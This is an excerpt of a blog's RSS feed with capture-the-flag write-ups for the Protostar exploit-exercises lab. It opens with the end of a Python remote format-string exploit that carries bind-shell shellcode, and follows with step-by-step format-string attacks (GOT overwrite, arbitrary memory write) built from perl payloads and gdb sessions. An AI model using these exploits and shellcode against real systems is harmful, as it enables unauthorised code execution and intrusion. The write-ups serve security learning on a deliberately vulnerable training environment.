                &amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot; \
                &amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot; \
                &amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot; \
                &amp;quot;\x0b\xcd\x80&amp;quot;

    # Open the connection
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    # Because the string in the syslog varies, due to it showing &amp;quot;Login from 192.168.1.1:19661&amp;quot; for example
    # Calculate length of junk filler, based on max ip+port combo being 255.255.255.255:65535
    # Write out 0xbffffc46 (start of shellcode) to 0x0804a11c (GOT of syslog)
    source_address = s.getsockname()[0]
    source_port = s.getsockname()[1]
    source_string = str(source_address) + &amp;quot;:&amp;quot; + str(source_port)

    junk_buffer_length = 21 - len(source_string)

    print(&amp;quot;[*] Sending format string as username&amp;quot;)
    s.send(&amp;quot;username XXX&amp;quot; + &amp;quot;X&amp;quot;*junk_buffer_length + syslog_address_1 + syslog_address_2 + syslog_address_3 + syslog_address_4 + &amp;quot;%14x%17$n&amp;quot; + &amp;quot;%182x%18$n&amp;quot; + &amp;quot;%259x%19$n&amp;quot; + &amp;quot;%192x%20$n&amp;quot; + &amp;quot;\n&amp;quot;)

    print(&amp;quot;[*] Sending password to trigger formatstring&amp;quot;)
    s.send(&amp;quot;login &amp;quot; + &amp;quot;B&amp;quot; + &amp;quot;\n&amp;quot;)

    print(&amp;quot;[*] Sending new username without format string&amp;quot;)
    s.send(&amp;quot;username X\n&amp;quot;)

    print(&amp;quot;[*] Sending shellcode as password&amp;quot;)
    s.send(&amp;quot;login &amp;quot; + shellcode + &amp;quot;\n&amp;quot;)

    s.close

    print(&amp;quot;[*] Exploit successfull! Now launch: nc &amp;quot; + str(host) + &amp;quot; 4444&amp;quot;)
    
if __name__ == &amp;quot;__main__&amp;quot;:
    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to exploit&amp;quot;)
    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2994, type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)

    (options, args) = parser.parse_args()
    
    exploit(options.hostname, options.portnum)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 4</title>
      <link>http://test.andreko.net/2012/02/02/exploit-exercises---protostar-format-4/</link>
      <pubDate>Thu, 02 Feb 2012 05:15:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/02/02/exploit-exercises---protostar-format-4/</guid>
      <description>&lt;p&gt;Next up is the last challenge in the Format String series, &lt;a href=&#34;http://exploit-exercises.com/protostar/format4&#34;&gt;Format 4&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out with the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void hello()
{
 printf(&amp;quot;code execution redirected! you win\n&amp;quot;);
 _exit(1);
}

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);

 printf(buffer);

 exit(1); 
}

int main(int argc, char **argv)
{
 vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What initially caught my eye was the fact that there was a call to &amp;ldquo;exit()&amp;rdquo; as well as &amp;ldquo;_exit()&amp;ldquo;.  This made me think back to my reading, and I realized it was going to be a GOT (Global Offset Table) overwrite on &amp;ldquo;exit()&amp;rdquo;.  When the program runs for the first time, the GOT is initialized to 0x00000000 for every external function, such as libc functions.  The first time it runs that function, it will cache the memory address in the GOT, so that it doesn&amp;rsquo;t have to ask libc, or the corresponding library each time.  If we overwrite the GOT value, we can make it execute arbitrary code instead of that original function.  In this case, our victim is &amp;ldquo;exit()&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;For this exploit to work, we will need a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Memory address of &amp;ldquo;exit()&amp;rdquo; in the GOT, which we want to overwrite&lt;/li&gt;
&lt;li&gt;Memory address of &amp;ldquo;hello()&amp;rdquo;, which will be the data we overwrite the GOT with&lt;/li&gt;
&lt;li&gt;Stack offset for the format string&lt;/li&gt;
&lt;li&gt;The amount of characters to buffer for each byte-pair&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Getting the memory address of the &amp;ldquo;exit()&amp;rdquo; method in the GOT is fairly easy:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -R format4

format4:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Getting the memory address of &amp;ldquo;hello()&amp;rdquo; is quite similar:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format4 | grep hello
080484b4 g     F .text  0000001e              hello
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To get the stack offset of the format string, it&amp;rsquo;s quite simple.  We&amp;rsquo;ve done it in prior challenges.  Let&amp;rsquo;s just spam &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAAAAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x15&#39;` | ./format4
AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this, we can now see &amp;ldquo;41414141&amp;rdquo; in the 4th stack variable, so our offset is 4.&lt;/p&gt;

&lt;p&gt;Using that offset of 4, we can now generate a format string using Direct Parameter Access, which I&amp;rsquo;ve only slightly mentioned in previous posts. I chose to dump the string to a file, because it made it really easy to use with gdb.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;\x24\x97\x04\x08&amp;quot;.&amp;quot;\x25\x97\x04\x08&amp;quot;.&amp;quot;\x26\x97\x04\x08&amp;quot;.&amp;quot;\x27\x97\x04\x08&amp;quot;.&amp;quot;%4\$n&amp;quot;&#39; &amp;gt; /home/user/format4_dpa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, if we run it in gdb, we can see how many characters are being written to &amp;ldquo;printf&amp;rdquo; initially, and adjust our buffering to compensate.  Start up the gdb debugger, and disassemble the &amp;ldquo;vuln&amp;rdquo; function.  We do this, so we can set a breakpoint right before &amp;ldquo;exit()&amp;rdquo; gets called.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb --quiet ./format4
Reading symbols from /opt/protostar/bin/format4...done.
(gdb) disassemble vuln
Dump of assembler code for function vuln:
0x080484d2 &amp;lt;vuln+0&amp;gt;:    push   %ebp
0x080484d3 &amp;lt;vuln+1&amp;gt;:    mov    %esp,%ebp
0x080484d5 &amp;lt;vuln+3&amp;gt;:    sub    $0x218,%esp
0x080484db &amp;lt;vuln+9&amp;gt;:    mov    0x8049730,%eax
0x080484e0 &amp;lt;vuln+14&amp;gt;:   mov    %eax,0x8(%esp)
0x080484e4 &amp;lt;vuln+18&amp;gt;:   movl   $0x200,0x4(%esp)
0x080484ec &amp;lt;vuln+26&amp;gt;:   lea    -0x208(%ebp),%eax
0x080484f2 &amp;lt;vuln+32&amp;gt;:   mov    %eax,(%esp)
0x080484f5 &amp;lt;vuln+35&amp;gt;:   call   0x804839c &amp;lt;fgets@plt&amp;gt;
0x080484fa &amp;lt;vuln+40&amp;gt;:   lea    -0x208(%ebp),%eax
0x08048500 &amp;lt;vuln+46&amp;gt;:   mov    %eax,(%esp)
0x08048503 &amp;lt;vuln+49&amp;gt;:   call   0x80483cc &amp;lt;printf@plt&amp;gt;
0x08048508 &amp;lt;vuln+54&amp;gt;:   movl   $0x1,(%esp)
0x0804850f &amp;lt;vuln+61&amp;gt;:   call   0x80483ec &amp;lt;exit@plt&amp;gt;
End of assembler dump.
(gdb) b *vuln+61
Breakpoint 1 at 0x804850f: file format4/format4.c, line 22.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After the breakpoint has been set, go ahead and run the program, piping in the formatstring from the file we created earlier:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) run &amp;lt; /home/user/format4_dpa
Starting program: /opt/protostar/bin/format4 &amp;lt; /home/user/format4_dpa

Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
22      format4/format4.c: No such file or directory.
        in format4/format4.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What we need to do, is examine the address of the GOT space for the &amp;ldquo;exit()&amp;rdquo; method, and now see what was set.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) x/1x 0x08049724
0x8049724 &amp;lt;_GLOBAL_OFFSET_TABLE_+36&amp;gt;:   0x00000010
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Good, so far we know: &lt;ul&gt;&lt;li&gt;GOT address to overwrite: 0x8049724&lt;/li&gt;&lt;li&gt;Value to overwrite it with: 0x080484b4&lt;/li&gt;&lt;/ul&gt;
We can use this data to now calculate all of the individual buffer sizes needed to get the right number of characters output by &amp;ldquo;printf&amp;rdquo;.  This little trick was learned from reading &lt;a href=&#34;http://www.amazon.com/gp/product/1593271441/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag=mattandcom-20&amp;amp;linkCode=as2&amp;amp;camp=1789&amp;amp;creative=390957&amp;amp;creativeASIN=1593271441&#34;&gt;Hacking: The Art of Exploitation, 2nd Edition&lt;/a&gt;&lt;img src=&#34;http://www.assoc-amazon.com/e/ir?t=mattandcom-20&amp;l=as2&amp;o=1&amp;a=1593271441&#34; width=&#34;1&#34; height=&#34;1&#34; border=&#34;0&#34; alt=&#34;&#34; style=&#34;border:none !important; margin:0px !important;&#34; /&gt;, which I highly recommend.  Without this book, I would have been stuck on these format string levels for a lot longer than I was. I just needed a little bump, and it gave it to me.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0xb4 - 0x00000010
$1 = 164
(gdb) p 0x84 - 0xb4
$2 = -48
(gdb) p 0x184 - 0xb4
$3 = 208
(gdb) p 0x04 - 0x84
$4 = -128
(gdb) p 0x104 - 0x84
$5 = 128
(gdb) p 0x08 - 0x04
$6 = 4
(gdb) p 0x108 - 0x04
$7 = 260
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To explain this, you take the address you want to overwrite with (0x080484b4 in our case) and split it up into the byte pairs in little endian order (b4, 84, 08, 08).  Starting with the first one (b4), you subtract the base number we saw get written before (0x00000010), and that will give us the first buffer length of 164.  For the second one, take the 2nd byte pair (84) and subtract the first byte pair (b4).  In this case, we went negative, so we add a &amp;ldquo;1&amp;rdquo; in the most significant digit of the first number, making ours &amp;ldquo;184&amp;rdquo;.  We then subtract again, and get 208.  You do this for all 4 pairs, and you get your offsets of 164, 208, 128, 260.&lt;/p&gt;

&lt;p&gt;Now that we have our buffer sizes, let&amp;rsquo;s construct the format string with them:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;\x24\x97\x04\x08&amp;quot;.&amp;quot;\x25\x97\x04\x08&amp;quot;.&amp;quot;\x26\x97\x04\x08&amp;quot;.&amp;quot;\x27\x97\x04\x08&amp;quot;.&amp;quot;%164x%4\$n&amp;quot;.&amp;quot;%208x%5\$n&amp;quot;.&amp;quot;%128x%6\$n&amp;quot;.&amp;quot;%260x%7\$n&amp;quot;&#39; &amp;gt; /home/user/format4_dpa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, we run the format4 program with the format4_dpa file as the input:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format4 &amp;lt; /home/user/format4_dpa           $%&amp;amp;&#39;                                                              

                                                                                                   200                                            

                                                                                                                                                  

          b7fd8420                                                                                                                        

bffff624                                                                                                                                          

                                                                                                                   8049724code execution 

redirected! you win
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that&amp;rsquo;s a win!&lt;/p&gt;

&lt;p&gt;I learned a lot of things in this section of the Protostar challenge.  I had almost no experience with format string exploitation, but now I&amp;rsquo;m feeling pretty comfortable with them.  We&amp;rsquo;ll have to see about the &lt;a href=&#34;http://exploit-exercises.com/protostar/final1&#34;&gt;Final 1&lt;/a&gt; level.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 3</title>
      <link>http://test.andreko.net/2012/02/01/exploit-exercises---protostar-format-3/</link>
      <pubDate>Wed, 01 Feb 2012 05:33:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/02/01/exploit-exercises---protostar-format-3/</guid>
      <description>&lt;p&gt;Continuing in the String Format section, the next challenge we run across is &lt;a href=&#34;http://exploit-exercises.com/protostar/format3&#34;&gt;Format 3&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We&amp;rsquo;re first given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void printbuffer(char *string)
{
 printf(string);
}

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);

 printbuffer(buffer);

 if(target == 0x01025544) {
  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
 } else {
  printf(&amp;quot;target is %08x :(\n&amp;quot;, target);
 }
}

int main(int argc, char **argv)
{
 vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This seems to be just like Format 2, except that we have to modify all 8 bytes instead of just 2.&lt;/p&gt;

&lt;p&gt;The process is still pretty much the same.  We will first find the memory address of &amp;ldquo;target&amp;rdquo;, to get that out of the way:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tried spamming the format3 executable with 15 &amp;ldquo;%x&amp;rdquo;, since the last couple challenges have been lower than the typical 150 I was doing.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
AAAA0.bffff5e0.b7fd7ff4.0.0.bffff7e8.804849d.bffff5e0.200.b7fd8420.bffff624.41414141.252e7825.78252e78.2e78252e.
target is 00000000 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It appears that we get our &amp;ldquo;41414141&amp;rdquo; at 12 bytes popped.  Let&amp;rsquo;s verify:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA%x%x%x%x%x%x%x%x%x%x%x%x | ./format3
AAAA0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff62441414141
target is 00000000 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So let&amp;rsquo;s try it with the memory address of &amp;ldquo;target&amp;rdquo; instead of &amp;ldquo;AAAA&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624
target is 00000041 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome! It&amp;rsquo;s overwriting properly.  Our last byte shows as &amp;ldquo;41&amp;rdquo;, meaning that printf wrote 41 characters.  However for the vulnerable program, it needs to be &amp;ldquo;44&amp;rdquo;, so let&amp;rsquo;s just increase it a little.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624
target is 00000044 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it appears if I use &amp;ldquo;%11x&amp;rdquo; for one of the stack pops, it&amp;rsquo;s just the right amount.  You can actually calculate this value using a calculator, but I&amp;rsquo;ve found myself usually just brute forcing it with multiple guesses.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s work on the next 2 bytes. From several of the books and papers listed in the previous challenge, I found out how to handle this. You just start appending more data, with a junk buffer, and possibly some spacing, and it will continue in a similar fashion. You then just increment the byte you want to overwrite, going upwards in the memory space, so you don&amp;rsquo;t overwrite the space you already wrote the first time.&lt;/p&gt;

&lt;p&gt;To feel out for how many stack pops we&amp;rsquo;d have to do, I experimented, and spammed an additional 15 after setting up the start of the next byte of &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKAAAAAAAA\xf5\x96\x04\x08&amp;quot; . &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKAAAAAAAA78257825.78257825.78257825.78257825.78257825.78313125.554a6e25.41414b4e.41414141.96f54141.78250804.2e78252e.252e7825.78252e78.2e78252e.
target is 00000044 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now pay attention here. You&amp;rsquo;ll see after 8 stack pops, you have &amp;ldquo;41414b4e.41414141&amp;rdquo;.  The first byte has some junk from a previous memory address. Since we can only pass 4 &amp;ldquo;A&amp;rdquo;s, we&amp;rsquo;ll need to buffer this a bit with additional junk bytes. To test that out, we can do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJUAAAA\xf5\x96\x04\x08%x%x%x%x%x%x%x%x%x&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJUAAAA782578257825782578257825782578257825782578313125554a6e25554a4b4e41414141
target is 00000044 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now if we just convert that final &amp;ldquo;%x&amp;rdquo; to a &amp;ldquo;%n&amp;rdquo;, we&amp;rsquo;ll overwrite the second memory address shown with the number of bytes printed.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4e
target is 00008e44 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome again! We overwrote the next 2 bytes!  But wait a minute.  It overwrote &amp;ldquo;8e&amp;rdquo;, and we want to get &amp;ldquo;55&amp;rdquo;.  There is nothing that we can add to &amp;ldquo;8e&amp;rdquo; to get &amp;ldquo;55&amp;rdquo;, as it&amp;rsquo;s larger.  We can&amp;rsquo;t subtract, so this poses an issue.  However, there&amp;rsquo;s nothing saying that we can&amp;rsquo;t overwrite 4 bytes instead of just 2.  We could simply add to &amp;ldquo;8e&amp;rdquo; until we get &amp;ldquo;255&amp;rdquo;, since the next 4 bytes needed are &amp;ldquo;0255&amp;rdquo;.  I played around with some math, and found that I could do exactly that!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4e
target is 00025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is convenient for us, because now we don&amp;rsquo;t have to do 4 separate overwrites, we can skip the third one, moving directly to the fourth.  For this last pair, we will need to write &amp;ldquo;01&amp;rdquo;.  Off the bat, with such a low number, I knew that we&amp;rsquo;d have to do something similar, since there&amp;rsquo;s no way we would ever be writing 0 characters in printf.  We would just have to raise it to &amp;ldquo;101&amp;rdquo;, and the first &amp;ldquo;1&amp;rdquo; would get cut off into a virtual la-la land.&lt;/p&gt;

&lt;p&gt;Again, let&amp;rsquo;s find the length of stack addresses to pop, by spamming 15 &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUNKAAAA&amp;quot; . &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUNKAAAA78257825.78257825.78257825.34257825.25783336.4e554a6e.4141414b.2e782541.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
target is 00025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time we have 7 pops, and again the buffer is mis-aligned.  So let&amp;rsquo;s test the 7 pops and fixing the buffer alignment:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUNAAAA%x%x%x%x%x%x%x&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUNAAAA78257825782578257825782534257825257833364e554a6e41414141
target is 00025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Removing one character from the 4-char word &amp;ldquo;JUNK&amp;rdquo; seemed to do the trick.  We are now showing &amp;ldquo;41414141&amp;rdquo; as the last word again.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s switch the last &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%n&amp;rdquo;, and the &amp;ldquo;AAAA&amp;rdquo; to our last memory address, and see what it outputs.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUN\xf7\x96\x04\x08%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUN78257825782578257825782534257825257833364e554a6e
target is 8c025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, so it&amp;rsquo;s giving &amp;ldquo;8c&amp;rdquo;, and we need to get to &amp;ldquo;101&amp;rdquo;.  That&amp;rsquo;s roughly 117 bytes difference.  I started tinkering from there, and found that it needed 125 extra characters.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUN\xf7\x96\x04\x08%x%x%x%x%x%125x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUN78257825782578257825782534257825257833364e554a6e
you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome! We actually were able to overwrite an arbitrary value in memory to a specific value of our desire.  Think of the implications of this.  I was solving it, and afterwards read about a very new string format vulnerability in &amp;ldquo;sudo&amp;rdquo;.  More information can be read &lt;a href=&#34;http://www.sudo.ws/sudo/alerts/sudo_debug.html&#34;&gt;here&lt;/a&gt;.  These are real-world applications, and these bugs are found in the wild.  It really blows my mind.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 2</title>
      <link>http://test.andreko.net/2012/01/31/exploit-exercises---protostar-format-2/</link>
      <pubDate>Tue, 31 Jan 2012 05:13:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/01/31/exploit-exercises---protostar-format-2/</guid>
      <description>&lt;p&gt;Continuing from where we left off, we arrive at &lt;a href=&#34;http://exploit-exercises.com/protostar/format2&#34;&gt;Format 2&lt;/a&gt;.  It presents us with the following code:&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);
 printf(buffer);

 if(target == 64) {
  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
 } else {
  printf(&amp;quot;target is %d :(\n&amp;quot;, target);
 }
}

int main(int argc, char **argv)
{
 vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This challenge seems very similar to Format 1, in all but 2 ways:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The input is done via a fgets() instead of from the program arguments.&lt;/li&gt;
&lt;li&gt;Instead of allowing just any change, it specifically requires &amp;ldquo;target&amp;rdquo; to be equal to &amp;ldquo;64&amp;rdquo;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We&amp;rsquo;ll start pretty much the same way as last time, spamming &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;AAAAAAAA&amp;quot; . &amp;quot;%x.&amp;quot;x150&#39;` | ./format2
AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.a2e78.b7eada75.b7fd7ff4.80496b0.bffff7c8.8048338.b7ff1040.80496b0.bffff7f8.80484f9.b7fd8304.b7fd7ff4.80484e0.bffff7f8.b7ec6365.b7ff1040.bffff7f8.80484c6.80484e0.0.bffff878.b7eadc76.1.bffff8a4.bffff8ac.b7fe1848.bffff860.ffffffff.b7ffeff4.8048285.1.bffff860.b7ff0626.
target is 0 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time, however, it seemed MUCH quicker to get the &amp;ldquo;41414141&amp;rdquo;, only 4 words.  Let&amp;rsquo;s verify:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format2
AAAA%x%x%x%x
